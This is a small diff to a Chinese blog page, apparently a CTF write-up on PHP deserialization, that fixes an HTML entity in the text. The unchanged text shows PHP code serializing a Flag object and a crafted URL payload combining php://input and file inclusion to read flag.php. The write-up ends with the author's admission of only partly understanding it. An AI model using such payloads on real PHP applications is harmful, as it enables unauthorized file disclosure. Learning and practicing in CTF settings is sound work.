@@ -193,7 +193,7 @@ class Flag{//flag.php
 <pre><code>$a = new Flag();
 $a-&gt;file = &quot;flag.php&quot;;
 $a = serialize($a);
-print_r($a);</code></pre><p>?&gt;该PHP即为将传入password的值获得的php,运行后得到O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}之后构造：payload:?txt=php://input&amp;file=hint.php&amp;password=O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}转发包即可获得flag.<br>&amp;emsp&amp;emsp:summary:今天一天的题都做得很蒙蔽，前两道到现在依旧没有做出来，死在了不会python上，后一道题，对于这个序列化的问题不是很清楚因而卡了很久，并且参考别人博客自己做着也是似懂非懂，因而下来还需继续努力将其搞懂，在完全明白后我还会来继续修改这一天博客的内容，修改我错误的理解，新增我所知道了的。</p>
+print_r($a);</code></pre><p>?&gt;该PHP即为将传入password的值获得的php,运行后得到O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}之后构造：payload:?txt=php://input&amp;file=hint.php&amp;password=O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}转发包即可获得flag.<br>&emsp;&emsp;:summary:今天一天的题都做得很蒙蔽，前两道到现在依旧没有做出来，死在了不会python上，后一道题，对于这个序列化的问题不是很清楚因而卡了很久，并且参考别人博客自己做着也是似懂非懂，因而下来还需继续努力将其搞懂，在完全明白后我还会来继续修改这一天博客的内容，修改我错误的理解，新增我所知道了的。</p>
 
       
 
